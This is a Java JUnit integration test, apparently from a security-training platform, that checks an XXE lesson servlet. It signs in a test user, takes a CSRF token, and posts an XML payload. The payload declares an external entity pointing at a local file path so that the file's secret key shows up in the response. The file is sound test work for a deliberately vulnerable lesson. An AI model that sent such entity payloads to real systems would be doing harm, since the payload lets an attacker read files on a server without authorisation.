package servlets.module.lesson;

import dbProcs.FileInputProperties;
import dbProcs.GetterTest;
import dbProcs.Setter;
import org.apache.log4j.Logger;
import org.junit.Assert;
import org.junit.Before;
import org.junit.BeforeClass;
import org.junit.Test;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;
import org.springframework.mock.web.MockServletConfig;
import testUtils.TestProperties;
import utils.InstallationException;

import static org.junit.Assert.fail;

public class XxeLessonIT
{
	private static String lang = "en_GB";
	private static Logger log = Logger.getLogger(XxeLessonIT.class);
	private static String applicationRoot = new String();
	private MockHttpServletRequest request;
    private MockHttpServletResponse response;

    /**
	 * Creates DB or Restores DB to Factory Defaults before running tests
	 */
	@BeforeClass
	public static void before()
	{
		TestProperties.setTestPropertiesFileDirectory(log);
		try 
		{
			TestProperties.executeSql(log);
			TestProperties.createFileSystemKey(log, "xxe.lesson.file", "xxe.lesson.solution");
		} 
		catch (InstallationException e) 
		{
			String message = "Could not create DB: " + e.toString();
			log.fatal(message);
			fail(message);
		}
	}
    
    @Before
	public void setup()
	{
        request = new MockHttpServletRequest();
        response = new MockHttpServletResponse();
        //Open All modules
        if(!Setter.openAllModules(applicationRoot, 0) && !Setter.openAllModules(applicationRoot, 1))
        	fail("Could not Mark All Modules As Open");
	}

	public String getModuleDoPost(byte[] xmlEmail, String csrfToken, int expectedResponseCode) throws Exception
	{
		try
		{
			String servletClassName = "XxeLesson";
			log.debug("Creating " + servletClassName + " Servlet Instance");
			XxeLesson servlet = new XxeLesson();
			servlet.init(new MockServletConfig(servletClassName));

			request.setContentType("application/xml");

			//Setup Servlet Parameters and Attributes
			log.debug("Setting Up Params and Atrributes");
			//for an XML payload instead of addParameter it's setContent with a byte array
			request.setContent(xmlEmail);
			//Adding Correct CSRF Token (Token Submitted)
			request.addHeader("csrfToken", csrfToken);

			log.debug("Running doPost");
			servlet.doPost(request, response);

			if(response.getStatus() != expectedResponseCode)
				fail(servletClassName + " Servlet Returned " + response.getStatus() + " Code. " + expectedResponseCode + " Expected");
			else
			{
				log.debug("302 OK Detected");
				log.debug(servletClassName + " Successful, returning location retrieved: " + response.getContentAsString());
				return(response.getContentAsString());
			}
		}
		catch(Exception e)
		{
			throw e;
		}
		return null;
	}

	@Test
	public void testLevelValidAnswerXxeInjection()
	{
		String userName = "lessonTester";
		try
		{
			//Verify User Exists in DB
			GetterTest.verifyTestUser(applicationRoot, userName, userName);
			//Sign in as Normal User
			log.debug("Signing in as " + userName + " Through LoginServlet");
			TestProperties.loginDoPost(log, request, response, userName, userName, null, lang);
			log.debug("Login Servlet Complete, Getting CSRF Token");
			if(response.getCookie("token") == null)
				fail("No CSRF Token Was Returned from Login Servlet");
			String csrfToken = response.getCookie("token").getValue();
			if(csrfToken.isEmpty())
			{
				String message = "No CSRF token returned from Login Servlet";
				log.fatal(message);
				fail(message);
			}
			else
			{
				request.setCookies(response.getCookies());
				String xxeString = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"
						+ "<!DOCTYPE foo ["
						+ "<!ELEMENT foo ANY >"
						+ "<!ENTITY xxe SYSTEM \"file://" + System.getProperty("user.dir")
						+ "/" + FileInputProperties.readfile(System.getProperty("user.dir")
						+ "/src/main/resources/fileSystemKeys.properties", "xxe.lesson.file") + "\""
						+ " >]><foo>&xxe;</foo>";

				//String xxeString = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><email>test@test.com</email>";

				//for XML you must use a byte array (xxeString.getBytes())
				String servletResponse = getModuleDoPost(xxeString.getBytes(), csrfToken, 302);

				Assert.assertTrue(servletResponse.contains("Marsellus Wallace&#39;s Key"));
				Assert.assertFalse(servletResponse.contains("You must be getting funky"));
			}
		}
		catch(Exception e)
		{
			log.fatal("Could not Complete: " + e.toString());
			fail("Could not Complete: " + e.toString());
		}
	}



}
